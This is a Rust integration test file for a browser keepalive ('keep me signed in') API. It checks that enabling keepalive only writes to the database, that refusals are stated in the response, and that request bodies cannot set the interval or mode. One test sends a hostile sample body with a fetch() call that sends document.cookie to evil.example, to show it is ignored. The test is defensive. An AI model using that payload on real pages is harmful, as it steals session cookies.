//! **"Keep me signed in" — the human's door**, asserted end to end over the real
//! router (bearer + `require_admin`, exactly as the phone reaches it).
//!
//! Three properties this file exists to keep true:
//!
//! 1. **Enabling starts no browser.** The design this replaces read the cookie
//!    jar inside the `PATCH` handler, which cold-starts Chrome (~2-5 s on a
//!    small box) while a phone waits — and then refused to enable on the answer.
//!    Enable is a plain DB write; the first sweep tick 60 s later does all the
//!    learning. `tab_count() == 0` afterwards is that property, measured.
//! 2. **The two refusals are said out loud**, not silently clamped: a
//!    non-`http(s)` page, and a fifth enabled tab.
//! 3. **The body cannot set the interval or the mode.** There is no interval
//!    picker by design, and a door that accepted `keepalive_every: 1` would be
//!    one.

use supermux_server::config::{Config, ProviderDefaults, TlsConfig};
use supermux_server::connectors::browser::keepalive;
use supermux_server::state::AppState;
use supermux_server::{db, http};

use axum::body::Body;
use axum::http::{header, Method, Request, StatusCode};
use http_body_util::BodyExt;
use serde_json::{json, Value};
use tower::ServiceExt;

const TOKEN: &str = "browser-keepalive-test-token";

async fn test_app() -> (axum::Router, AppState, std::path::PathBuf) {
    let dir = std::env::temp_dir().join(format!("supermux-ka-api-{}", uuid::Uuid::new_v4()));
    std::fs::create_dir_all(&dir).unwrap();
    let config = Config {
        data_dir: dir.clone(),
        bind: "127.0.0.1:0".parse().unwrap(),
        extra_binds: vec![],
        extra_origins: vec![],
        tls: TlsConfig::default(),
        auth_token: TOKEN.to_string(),
        provider_defaults: ProviderDefaults::default(),
        ws: Default::default(),
        remote_callback_url: None,
        push_sub: None,
        github_token: None,
        statusline_tap: false,
        swarm_reaper: Default::default(),
        isolation_mode: supermux_server::isolation::IsolationMode::BestEffort,
        company_isolation: Vec::new(),
        human_auth: Default::default(),
    };
    let pool = db::init(&config).await.expect("db init");
    let state = AppState::new(pool, config);
    (http::router(state.clone()), state, dir)
}

async fn send(
    app: &axum::Router,
    method: Method,
    uri: &str,
    body: Option<Value>,
) -> (StatusCode, Value) {
    let mut builder = Request::builder()
        .method(method)
        .uri(uri)
        .header(header::AUTHORIZATION, format!("Bearer {TOKEN}"));
    let req = match body {
        Some(b) => {
            builder = builder.header(header::CONTENT_TYPE, "application/json");
            builder.body(Body::from(b.to_string())).unwrap()
        }
        None => builder.body(Body::empty()).unwrap(),
    };
    let resp = app.clone().oneshot(req).await.unwrap();
    let status = resp.status();
    let bytes = resp.into_body().collect().await.unwrap().to_bytes();
    let value: Value = if bytes.is_empty() {
        Value::Null
    } else {
        serde_json::from_slice(&bytes).unwrap_or(Value::Null)
    };
    (status, value)
}

/// Mint a tab ROW without `?open=true` — the lazy path, so no chrome anywhere.
async fn mint(state: &AppState, url: &str) -> String {
    let id = db::browser_tabs::new_tab_id();
    db::browser_tabs::create(&state.pool, &id, url, None, &["example.com".to_string()])
        .await
        .expect("create tab row");
    id
}

#[tokio::test]
async fn enabling_is_a_db_write_that_starts_no_browser_and_schedules_the_first_tick_now() {
    let (app, state, dir) = test_app().await;
    let id = mint(&state, "https://example.com/").await;

    let (status, tab) = send(
        &app,
        Method::PATCH,
        &format!("/api/browser/tabs/{id}"),
        Some(json!({ "keepalive_enabled": true })),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{tab}");

    // The four flat fields the menu row reads — and nothing else.
    assert_eq!(tab["keepalive_enabled"], json!(true));
    assert_eq!(tab["keepalive_every"], json!(keepalive::BLIND_MINUTES));
    assert_eq!(tab["keepalive_action"], json!(keepalive::ACTION_SOFT));
    assert_eq!(
        tab["last_keepalive_at"],
        Value::Null,
        "NULL is what `due_at` reads as due-now, so the first tick lands inside 60 s"
    );

    // THE property: no chrome was started inside the handler.
    assert_eq!(
        state.browser.tab_count().await,
        0,
        "PATCH must never wake a tab — enabling on a cold box has to return in DB time"
    );

    // The sweep's read sees it.
    let rows = db::browser_tabs::list_keepalive(&state.pool)
        .await
        .expect("list");
    assert_eq!(rows.len(), 1);
    assert_eq!(rows[0].id, id);

    // Off keeps the learned cadence visible.
    let (status, tab) = send(
        &app,
        Method::PATCH,
        &format!("/api/browser/tabs/{id}"),
        Some(json!({ "keepalive_enabled": false })),
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(tab["keepalive_enabled"], json!(false));
    assert_eq!(tab["keepalive_every"], json!(keepalive::BLIND_MINUTES));
    assert!(db::browser_tabs::list_keepalive(&state.pool)
        .await
        .unwrap()
        .is_empty());

    // Both human acts are on the record.
    let actions: Vec<String> = sqlx::query_scalar("SELECT action FROM audit_log ORDER BY id")
        .fetch_all(&state.pool)
        .await
        .expect("audit rows");
    assert!(actions.iter().any(|a| a == "browser.keepalive_on"));
    assert!(actions.iter().any(|a| a == "browser.keepalive_off"));

    let _ = std::fs::remove_dir_all(&dir);
}

#[tokio::test]
async fn a_page_that_cannot_be_pinged_is_refused_out_loud() {
    let (app, state, dir) = test_app().await;
    let id = mint(&state, "about:blank").await;
    let (status, body) = send(
        &app,
        Method::PATCH,
        &format!("/api/browser/tabs/{id}"),
        Some(json!({ "keepalive_enabled": true })),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    assert!(
        body.to_string().contains("only web pages"),
        "the refusal has to say why: {body}"
    );
    assert!(db::browser_tabs::list_keepalive(&state.pool)
        .await
        .unwrap()
        .is_empty());
    let _ = std::fs::remove_dir_all(&dir);
}

#[tokio::test]
async fn the_fifth_tab_is_refused_with_the_reason_and_the_number() {
    let (app, state, dir) = test_app().await;
    let mut ids = Vec::new();
    for n in 0..=keepalive::MAX_ENABLED_TABS {
        ids.push(mint(&state, &format!("https://site{n}.example/")).await);
    }
    for id in ids.iter().take(keepalive::MAX_ENABLED_TABS) {
        let (status, _) = send(
            &app,
            Method::PATCH,
            &format!("/api/browser/tabs/{id}"),
            Some(json!({ "keepalive_enabled": true })),
        )
        .await;
        assert_eq!(status, StatusCode::OK);
    }
    let (status, body) = send(
        &app,
        Method::PATCH,
        &format!("/api/browser/tabs/{}", ids[keepalive::MAX_ENABLED_TABS]),
        Some(json!({ "keepalive_enabled": true })),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    assert!(
        body.to_string().contains("at most 4 tabs"),
        "the cap and its cost have to be in the message: {body}"
    );

    // Re-enabling one that is ALREADY on must not trip its own cap.
    let (status, _) = send(
        &app,
        Method::PATCH,
        &format!("/api/browser/tabs/{}", ids[0]),
        Some(json!({ "keepalive_enabled": true })),
    )
    .await;
    assert_eq!(status, StatusCode::OK);

    let _ = std::fs::remove_dir_all(&dir);
}

/// There is no interval picker, by design — so the door must not have one
/// either. A body naming the cadence or the mode is ignored, not honoured.
#[tokio::test]
async fn the_body_cannot_set_the_interval_or_the_mode() {
    let (app, state, dir) = test_app().await;
    let id = mint(&state, "https://example.com/").await;
    let (status, tab) = send(
        &app,
        Method::PATCH,
        &format!("/api/browser/tabs/{id}"),
        Some(json!({
            "keepalive_enabled": true,
            "keepalive_every": 1,
            "keepalive_action": "reload",
            "keepalive_url": "https://evil.example/collect",
            "keepalive_script": "fetch('https://evil.example/'+document.cookie)"
        })),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{tab}");
    assert_eq!(tab["keepalive_every"], json!(keepalive::BLIND_MINUTES));
    assert_eq!(tab["keepalive_action"], json!(keepalive::ACTION_SOFT));

    let row = db::browser_tabs::get(&state.pool, &id)
        .await
        .unwrap()
        .unwrap();
    assert_eq!(row.keepalive_every, keepalive::BLIND_MINUTES);
    assert_eq!(row.keepalive_action, keepalive::ACTION_SOFT);
    assert_eq!(
        row.keepalive_url, None,
        "a per-tab keep-alive URL is what would let a body choose the request"
    );
    assert_eq!(
        row.keepalive_script, None,
        "a per-tab JS payload is what would turn a keep-alive into an exfiltration primitive"
    );

    let _ = std::fs::remove_dir_all(&dir);
}
